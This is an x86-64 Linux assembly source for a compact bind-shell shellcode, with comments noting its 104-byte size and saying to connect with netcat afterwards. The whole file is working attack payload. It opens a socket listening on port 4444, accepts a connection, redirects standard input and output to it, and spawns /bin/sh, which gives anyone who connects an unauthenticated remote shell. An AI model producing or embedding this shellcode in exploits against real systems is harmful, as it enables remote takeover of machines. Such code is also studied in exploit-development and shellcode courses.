;this shellcode contains 104 bytes, unlike previous one, wich contained a 131
;after you run the shellcode open another terminal an run 'netcat -vv 0.0.0.0 4444'
global _start


section .text

_start:
		
	

	;create_socket
	;int socket(AF_INET, SOCK_STREAM, 0);

	push 	41	;sys_socket
	pop 	rax
	push 	2	;AF_INET	
	pop 	rdi
	push	1	;SOCK_STREAM
	pop	rsi
	xor 	rdx,	rdx
	syscall

	;save the return value for future use
	xchg rdi, rax
	

	; sin_zero:        0
        ; sin_addr.s_addr: INADDR_ANY = 0
        ; sin_port:        4444
        ; sin_family:      AF_INET = 2

	push	2		;sin_family = AF_INET
	mov word [rsp + 2], 0x5c11	;port = 4444
	push	rsp
	pop	rsi		




bind:
	;int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);

	push 	49		;sys_bind
	pop 	rax
	push	rsp	
	pop 	rsi		;sockaddr stack pointer
	push	16		;sizeof sockaddr
	pop	rdx
	syscall


listen:
	;int listen(int sockfd, int backlog);
		
	push 	50		;sys_listen
	pop 	rax
	push	1
	pop	rsi		;backlog = number of clients = 1 
	syscall

	
accept:
	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);	


		

	push	43		;sys_accept
	pop	rax
	sub	rsp,	16	;size of the structure on the stack
	push	rsp
	pop	rsi		;struct sockaddr
	push	16		;length of the  address
	push	rsp		;stack pointer for struct size
	pop	rdx		
	syscall
	
	
	xchg r10, 	rax	;save client socket in r10, since we won't use that register  for any other operation

	
close:
	;int close(int fd);
	
	push	3		;sys_close
	pop 	rax
	push	rax		;save 3 on the stack for rsi in dup2
	syscall

	
	xchg    rdi,	r10	;client socket as first parameter for dup2
	pop 	rsi		;parameter for dup2 = 3 
	
dup2loop:
	
	; int dup2(int oldfd, int newfd);

	push	33		;sys_dup2
	pop	rax
	dec 	rsi		
	syscall
	loopnz  dup2loop	
		


spawn_shell:
	
	;int execve(const char *filename, char *const argv[],char *const envp[]);

	xor rsi,	rsi			;clear rsi
	push		rsi			;push null on the stack
	mov 	rdi,	0x68732f2f6e69622f	 ;/bin//sh in reverse order
	push	rdi
	push	rsp		
	pop	rdi				;stack pointer to /bin//sh
	mov 	al,	59			;sys_execve
	cdq					;sign extend of eax
	syscall





